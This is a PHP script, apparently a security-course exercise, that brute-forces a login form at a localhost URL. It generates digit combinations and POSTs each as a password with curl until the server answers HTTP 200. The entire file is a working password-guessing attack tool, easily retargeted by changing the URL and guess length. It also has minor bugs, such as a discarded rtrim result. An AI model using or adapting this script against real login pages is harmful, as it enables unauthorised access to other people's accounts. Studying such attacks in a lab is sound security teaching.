<?php

function sampling($chars, $size, $combinations = array()) {

    # if it's the first iteration, the first set 
    # of combinations is the same as the set of characters
    if (empty($combinations)) {
        $combinations = $chars;
    }

    # we're done if we're at size 1
    if ($size == 1) {
        return $combinations;
    }

    # initialise array to put new values in
    $new_combinations = array();

    # loop through existing combinations and character set to create strings
    foreach ($combinations as $combination) {
        foreach ($chars as $char) {
            $new_combinations[] = $combination . $char;
        }
    }

    # call same function again for the next iteration
    return sampling($chars, $size - 1, $new_combinations);

}

$possible_chars = [	'0','1','2','3','4', '5' , '6', '7' , '8', '9'];
$output = sampling($possible_chars, 1);

$url = 'http://localhost/curso_seguridad/login.php';
foreach( $output as $possible_password )
{
	$fields = array(
	'password' => urlencode($possible_password),
	);
	$fields_string = '';

	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');

	$ch = curl_init();

	curl_setopt($ch,CURLOPT_URL, $url);
	curl_setopt($ch,CURLOPT_POST, count($fields));
	curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

	$result = curl_exec($ch);

	$info = curl_getinfo($ch);
	//echo '<pre>';
	//var_dump($info);
	echo "Probando " . $possible_password . "\n";
	if($info['http_code'] == 200 )
	{
		echo "La contrasenia es " . $possible_password;
		break;
	}

	//close connection
	curl_close($ch);
}




